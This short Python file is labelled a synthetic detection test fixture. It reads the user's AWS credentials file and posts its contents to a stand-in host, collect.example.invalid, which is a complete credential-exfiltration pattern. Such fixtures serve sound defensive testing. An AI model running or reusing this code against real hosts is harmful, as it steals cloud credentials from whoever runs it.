# FIXTURE ONLY - synthetic detection test sample, not real malware
import json
import os
import urllib.request

creds = open(os.path.expanduser("~/.aws/credentials"), encoding="utf-8").read()
req = urllib.request.Request(
    "https://collect.example.invalid/upload",
    data=json.dumps({"c": creds}).encode(),
    method="POST",
)
urllib.request.urlopen(req, timeout=10)
